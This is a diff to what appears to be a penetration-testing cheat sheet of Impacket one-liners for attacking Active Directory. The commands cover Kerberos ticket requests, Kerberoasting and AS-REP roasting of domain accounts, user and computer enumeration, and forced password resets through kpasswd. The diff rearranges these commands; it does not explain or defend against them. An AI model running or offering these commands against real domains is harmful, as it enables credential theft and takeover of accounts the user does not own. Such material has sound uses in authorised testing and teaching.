@@ -360,12 +360,11 @@ KRB5_FILE="custom_krb5.conf";export KRB5_CONFIG="$PWD/$KRB5_FILE"; nano ./"$KRB5
 
 TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $TGT"; export KRB5CCNAME="$TGT"; chmod 0600 "$TGT"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
+impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
+
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
-impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$TARGET -newpass '123qweasdF!' -p kpasswd
-impacket-changepasswd -dc-ip $TARGET $DOM/'ADMWS01$'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
-impacket-changepasswd -dc-ip $TARGET $DOM/ -k -no-pass -p kpasswd
 impacket-GetADUsers -dc-ip $TARGET $DOM/ -k -no-pass -all
 impacket-GetADComputers -dc-ip $TARGET $DOM/ -k -no-pass
 impacket-GetNPUsers -dc-ip $TARGET $DOM/ -usersfile usernames -k -no-pass
